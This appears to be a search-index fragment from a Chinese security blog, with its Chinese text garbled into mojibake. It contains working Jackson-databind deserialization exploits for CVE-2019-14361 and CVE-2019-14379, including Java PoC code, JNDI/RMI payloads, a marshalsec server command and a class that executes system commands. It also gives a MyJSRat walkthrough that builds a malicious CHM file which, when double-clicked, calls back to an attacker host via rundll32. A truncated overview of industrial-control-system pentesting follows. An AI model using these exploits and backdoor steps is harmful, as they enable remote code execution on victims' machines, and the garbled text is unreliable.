","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:6:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2019-14361 ä¸ CVE-2019-14379 æ¼æ´å¤ç°","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-14361ä¸CVE-2019-14379æ¼æ´å¤ç°","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2019-14361 \u0026 CVE-2019-14379æ¼æ´å¤ç° 7æœˆ30æ—¥æ™šæ”¶åˆ°äº†æ¨é€ï¼Œå¾—çŸ¥ Jackson-databind åˆå‡ºäº†æ–°çš„ RCE ï¼Œåˆæœ‰å¤§ä½¬æ‰¾åˆ°äº†æ–°çš„åˆ©ç”¨æ–¹å¼ã€‚ ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-14361ä¸CVE-2019-14379æ¼æ´å¤ç°","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´åˆ†æ æ ¹æ® Jackson å¼€å‘è€…çš„ issue ï¼Œè§¦å‘è¿™ä¸ª Jackson æ¼æ´éœ€è¦æ»¡è¶³å¦‚ä¸‹è¦æ±‚ï¼Œ ç›®æ ‡åº”ç”¨æ¥æ”¶åˆ°ä¸å¯ä¿¡å®¢æˆ·ç«¯å‘é€çš„ JSON æ•°æ® ç›®æ ‡åº”ç”¨ä½¿ç”¨å¤šæ€ç±»å‹å¤„ç†æ–¹å¼æ¥å¤„ç† java.lang.Object ç±»å‹çš„å±æ€§ï¼› åœ¨è¯¥æ¼æ´ä¸­å°±æ˜¯ä¾èµ–çš„ç¬¬ä¸‰æ–¹ jar åŒ…æœ‰ç‚¹å¤š(æ„Ÿè§‰åœ¨å®é™…åˆ©ç”¨è¿‡ç¨‹ä¸­èƒ½é‡åˆ°è¿™äº›ä¸ªåº“ä¹ŸæŒºå·§çš„) ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-14361ä¸CVE-2019-14379æ¼æ´å¤ç°","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º æœ¬æ–‡ä¸­ç”¨åˆ°çš„ç¬¬ä¸‰æ–¹åº“æœ‰ï¼š jackson-annotations-2.9.8 jackson-core-2.9.8 jackson-databind-2.9.8 ehcache-2.9.1 slf4j-api-1.7.7 logback-core-1.3.0-alpha4 slf4j-simple-1.7.21 javax.transaction_1.0.0.0_1-1 åœ¨ http://www.mvnrepository.com ä¸Šä¸‹è½½å³å¯ã€‚ ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-14361ä¸CVE-2019-14379æ¼æ´å¤ç°","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´ä»£ç  import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.SerializationFeature; import java.lang.Exception; public class Main { public static void main(String[] args) { System.out.println(\"Mapping\"); // æ³¨æ„ï¼Œåœ¨é«˜ç‰ˆæœ¬çš„JDKä¸Šå­˜åœ¨é™åˆ¶ï¼Œéœ€è¦å°†com.sun.jndi.rmi.object.trustURLCodebaseçš„å€¼è®¾ç½®ä¸ºtrueï¼Œé»˜è®¤ä¸ºfalse System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); // CVE-2019-14361 payload String jsonStr1 = \"[\\\"ch.qos.logback.core.db.JNDIConnectionSource\\\", {\\\"jndiLocation\\\":\\\"rmi://127.0.0.1:1099/ExportObject\\\"}]\"; // CVE-2019-14379 payload String jsonStr2 = \"[\\\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\\\",{\\\"properties\\\":{\\\"jndiName\\\":\\\"rmi://127.0.0.1:1099/ExportObject\\\"}}]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false); System.out.println(\"Serializing\"); Object obj = null; try { // !-\u003eæ­¤å¤„æ›´æ¢payload\u003c-! obj = mapper.readValue(jsonStr1, java.lang.Object.class); } catch(Exception e) { e.printStackTrace(); } System.out.println(\"objectified\"); try { mapper.writeValueAsString(obj); } catch(Exception e) { e.printStackTrace(); } try { System.out.println(\"stringified: \" + mapper.writeValueAsString(obj)); } catch(Exception e) { e.printStackTrace(); } } } ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-14361ä¸CVE-2019-14379æ¼æ´å¤ç°","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ„å»ºæ­¥éª¤ æœ¬æ–‡åœ¨ IDEA ä¸Šç”Ÿæˆé¡¹ç›® æ–°å»º java Commandline é¡¹ç›® å°†ä¸Šè¿°ä»£ç å¤åˆ¶è¿› Main å‡½æ•° å•å‡»çº¢æ¡†ä¸­çš„å›¾æ ‡ï¼Œè¿›å…¥é¡¹ç›®ç»“æ„è®¾ç½® å°†ä¸‹è½½å¥½çš„å¤–éƒ¨åº“å¯¼å…¥åˆ°é¡¹ç›®ä¸­ å…·ä½“å¯¼å…¥æ­¥éª¤å¯ä»¥å‚è€ƒæˆ‘çš„è¿™ç¯‡æ–‡ç« ï¼Œå†æ­¤ä¸åšèµ˜è¿° https://www.secquan.org/BugWarning/1069944 ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-14361ä¸CVE-2019-14379æ¼æ´å¤ç°","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ”»å‡»æµç¨‹ å¼€å¯ RMI æœåŠ¡ ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨marshalsecè¿™æ¬¾ç¥å™¨ï¼Œå¯ä»¥å¿«é€Ÿå¼€å¯ RMI å’Œ LDAP æœåŠ¡ã€‚å½“ç„¶ä½ éœ€è¦ä¸‹è½½æºç åŒ…ï¼Œä½¿ç”¨ maven ç¼–è¯‘ã€‚ä¸‹è½½é“¾æ¥ï¼šhttps://github.com/mbechler/marshalsecï¼Œä¸‹è½½åˆ°æœ¬åœ°åï¼Œåˆ©ç”¨ mvn clean package -DskipTests å³å¯ç¼–è¯‘ï¼Œç¼–è¯‘çš„ç»“æœå¦‚ä¸‹ï¼š å¼€å¯ RMI æœåŠ¡ï¼š java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8000/#ExportObject æ³¨ï¼šï¼š# åé¢å¡«å†™ä½ çš„æ¶æ„ç±»çš„ç±»åï¼Œå®ƒä¼šè‡ªåŠ¨ç»‘å®š URIï¼Œrmi é»˜è®¤ç«¯å£å·ä¸º 1099 ã€‚ ç¼–è¯‘ ExportObject.java ExportObject.javaä»£ç å†…å®¹å¦‚ä¸‹ï¼š package com.by.rmi; import java.io.BufferedReader; import java.io.InputStreamReader; public class ExportObject { public ExportObject() throws Exception { Process proc = Runtime.getRuntime().exec(\"open /Applications/Calculator.app\"); BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream())); StringBuffer sb = new StringBuffer(); String line; while((line = br.readLine()) != null) { sb.append(line).append(\"\\n\"); } String result = sb.toString(); Exception e = new Exception(result); throw e; } public static void main(String[] args) throws Exception { ExportObject e = new ExportObject(); } } æ³¨ï¼šä¸Šè¿°ä»£ç çš„åŠŸèƒ½ä¸ºåœ¨ mac å¹³å°ä¸Šå¼¹å‡ºè®¡ç®—å™¨ï¼Œå¦‚æ›´æ¢å¹³å°ï¼Œè¯·è‡ªè¡Œæ›´æ¢ exec å‡½æ•°ä¸­çš„å†…å®¹ã€‚ ç¼–è¯‘æˆclassæ–‡ä»¶ï¼š javac ExportObject.java åœ¨ç”Ÿæˆ ExportObject.class æ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œ python2 -m SimpleHTTPServer 8000ï¼Œåœ¨æœ¬åœ°å¯åŠ¨ HTTP æœåŠ¡ã€‚ ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-14361ä¸CVE-2019-14379æ¼æ´å¤ç°","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2019-14361 æµ‹è¯• å°† POC ä¸­çš„ payload æ›´æ¢ä¸º jsonStr1ï¼Œå¹¶ç¼–è¯‘è¿è¡Œï¼Œç»“æœå¦‚ä¸‹ï¼š ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:6:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-14361ä¸CVE-2019-14379æ¼æ´å¤ç°","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2019-14379 æµ‹è¯• å°† POC ä¸­çš„ payload æ›´æ¢ä¸º jsonStr2ï¼Œå¹¶ç¼–è¯‘è¿è¡Œï¼Œç»“æœå¦‚ä¸‹ï¼š ç›¸åº”çš„ï¼Œrmi æœåŠ¡è¿è¡Œçš„æˆªå›¾å¦‚ä¸‹ï¼š ","date":"2019-08-01","objectID":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:7:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"CVE-2019-14361ä¸CVE-2019-14379æ¼æ´å¤ç°","uri":"/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:0","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"MyJSRat MyJSRat æ˜¯ JSBackdoor çš„ python ç‰ˆæœ¬ ä¸‹è½½åœ°å€:https://github.com/Ridter/MyJSRat ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:1:0","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Easy CHM CHMæ˜¯è‹±è¯­ Compiled Help Manual çš„ç®€å†™ï¼Œå³ã€Œå·²ç¼–è¯‘çš„å¸®åŠ©æ–‡ä»¶ã€ã€‚CHM æ˜¯å¾®è½¯æ–°ä¸€ä»£çš„å¸®åŠ©æ–‡ä»¶æ ¼å¼ï¼Œåˆ©ç”¨ HTML ä½œæºæ–‡ï¼ŒæŠŠå¸®åŠ©å†…å®¹ä»¥ç±»ä¼¼æ•°æ®åº“çš„å½¢å¼ç¼–è¯‘å‚¨å­˜ã€‚ ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:0","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æ­¥éª¤ ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:0","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ä¸‹è½½ MyJSRat å¹¶è¿è¡Œ git clone https://github.com/Ridter/MyJSRat python MyJSRat.py -i IPaddr -p port ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:1","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ä¸‹è½½ wtf æ–‡ä»¶ æµè§ˆå™¨è®¿é—® https://IPaddr:port/wtfï¼Œå¹¶ä¿å­˜è‡³ txt æ–‡ä»¶ä¸­ ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:2","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å°†ä¸Šé¢ä¿å­˜çš„ä»£ç å†™å…¥åˆ°å¦‚ä¸‹ä»£ç çš„ Item1 çš„ Value å€¼ä¸­ æ³¨ï¼šè¦åœ¨ rundll32.exe å‰åæ·»åŠ , \u003c!DOCTYPE html\u003e\u003chtml\u003e\u003chead\u003e\u003ctitle\u003eMousejack replay\u003c/title\u003e\u003chead\u003e\u003c/head\u003e\u003cbody\u003ecommand exec \u003cOBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1\u003e\u003cPARAM name=\"Command\" value=\"ShortCut\"\u003e \u003cPARAM name=\"Button\" value=\"Bitmap::shortcut\"\u003e \u003cPARAM name=\"Item1\" value=',rundll32.exe,'\u003e \u003cPARAM name=\"Item2\" value=\"273,1,1\"\u003e\u003c/OBJECT\u003e\u003cSCRIPT\u003ex.Click();\u003c/SCRIPT\u003e\u003c/body\u003e\u003c/html\u003e ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:3","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ä¿å­˜ä¸º HTML æ–‡ä»¶ æ–°å»ºç›®å½•ï¼Œå°†ä¸Šè¿°ä»£ç ä¿å­˜åœ¨æ–°å»ºæ–‡ä»¶å¤¹ä¸­ ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:4","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"é€šè¿‡ EasyCHM åˆ¶ä½œ CHM æ–‡ä»¶ é€šè¿‡EasyCHMç¼–è¯‘exp.htmlæ–‡ä»¶ ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:5","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"åŒå‡»ä¸Šçº¿ æ­¤æ—¶åªè¦åŒå‡»test.CHMæ–‡ä»¶ï¼Œå³å¯ä¸Šçº¿ ","date":"2019-07-28","objectID":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:6","tags":["Tips","æ¸—é€æµ‹è¯•"],"title":"MyJSRatç»“åˆCHMå‘½ä»¤æ‰§è¡Œ","uri":"/2019/07/myjsrat%E7%BB%93%E5%90%88chm%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥æ§å®‰å…¨æ¸—é€ç›¸å…³","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥æ§å®‰å…¨æ¸—é€ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:0:0","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥ä¸šæ§åˆ¶ç³»ç»Ÿçš„ç»“æ„å’Œåœºæ™¯ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:0","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥ä¸šæ§åˆ¶ç³»ç»Ÿåœºæ™¯â€”â€”å•¤é…’å‚ å•¤é…’å·¥å‚å¸ƒå±€ ç›‘æ§æ€»æ§å®¤ ç”Ÿäº§çº¿è®¾å¤‡ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:1","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç»“æ„ ä¼ æ„Ÿå™¨å’Œæ‰§è¡Œå™¨ å¯ç¼–ç¨‹æ§åˆ¶å™¨(PLC) å·¥ä¸šç½‘ç»œåŠç°åœºæ€»çº¿ å·¥ä¸šè®¡ç®—æœºåŠå·¥ä¸šç»„æ€è½¯ä»¶ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:2","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥ä¸šæ§åˆ¶ç³»ç»Ÿåº”ç”¨åœºæ™¯ è¿‡ç¨‹è‡ªåŠ¨åŒ–æ§åˆ¶ç³»ç»Ÿ åº”ç”¨åœ¨æµç¨‹è¡Œä¸šï¼Œæ¯”å¦‚ï¼šçŸ³æ²¹ï¼ŒåŒ–å·¥ï¼ŒåŒ»è¯ã€‚å†¶é‡‘ï¼Œæ°´å¤„ç† å¯¹åº”çš„æ§åˆ¶ç³»ç»Ÿï¼šDCS(é›†æ•£æ§åˆ¶ç³»ç»Ÿ)å±…å¤šï¼Œå¤§å‹ PLC ä¸ºä¸»ï¼Œå•å°æ§åˆ¶å™¨ IO ç‚¹æ•°(ä¼ æ„Ÿå™¨ä¸æ‰§è¡Œå™¨çš„æ•°é‡)å¤šæ•°åœ¨2000 ç‚¹ä»¥ä¸Šï¼Œå…¨å†—ä½™æ¶æ„ å·¥å‚è‡ªåŠ¨åŒ–æ§åˆ¶ç³»ç»Ÿ åº”ç”¨åœ¨ç¦»æ•£è¡Œä¸šï¼Œæ¯”å¦‚ï¼šæ±½è½¦ï¼Œæ¸¯å£ï¼ŒçƒŸè‰ å¯¹åº”æ§åˆ¶ç³»ç»Ÿï¼šä¸»è¦ä»¥ PLC ä¸ºä¸»ï¼Œé‡‡ç”¨å’Œè®¾å¤‡æ†ç»‘ä¸ºä¸»ï¼Œå•å°æ§åˆ¶IOç‚¹æ•°å°‘äº2000ç‚¹ï¼Œå•æœºä¸ºä¸» ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:1:3","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥ä¸šæ§åˆ¶ç³»ç»Ÿå‚å•†å’Œäº§å“ä»‹ç» ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:0","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Siemensâ€”â€”æ§åˆ¶ç³»ç»Ÿå®¶æ— s7-1500 æ§åˆ¶ç³»ç»Ÿ S7-1200 æ§åˆ¶ç³»ç»Ÿ S7-300/400 æ§åˆ¶ç³»ç»Ÿ S7-WINAC æ§åˆ¶ç³»ç»Ÿ(PC æ¨¡æ‹Ÿ PLCï¼Œå¤šç”¨äºé«˜æ ¡ç ”ç©¶) ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:1","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Siemensâ€”â€”ç»„æ€å®¶æ— TIA åšå›¾/Step7(ç¼–ç¨‹) WINCC ç»„æ€ç›‘æ§è½¯ä»¶(ç›‘æ§) PLCSIM æ¨¡æ‹Ÿä»¿çœŸè½¯ä»¶(å‰æœŸæ¨¡æ‹Ÿä»¿çœŸ) ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:2","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Siemensâ€”â€”é€šè®¯åè®®åŠç«¯å£ S7 Commåè®®(ç§æœ‰åè®®) é€šè®¯ç«¯å£(102) ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:3","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Rockwell Automationâ€”â€”æ§åˆ¶ç³»ç»Ÿå®¶æ— Controllogix æ§åˆ¶ç³»ç»Ÿ Compactlogix æ§åˆ¶ç³»ç»Ÿ MicroLogix æ§åˆ¶ç³»ç»Ÿ Softlogix æ§åˆ¶ç³»ç»Ÿ ","date":"2019-07-28","objectID":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/:2:4","tags":["æ¸—é€æµ‹è¯•","å·¥æ§å®‰å…¨æ¸—é€"],"title":"å·¥æ§å®‰å…¨æ¸—é€","uri":"/2019/07/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Rockwell Automationâ€”â€”ç»„æ€å®¶æ— Studio5000/RSLogix 5000ç»„æ€è½¯ä»¶ 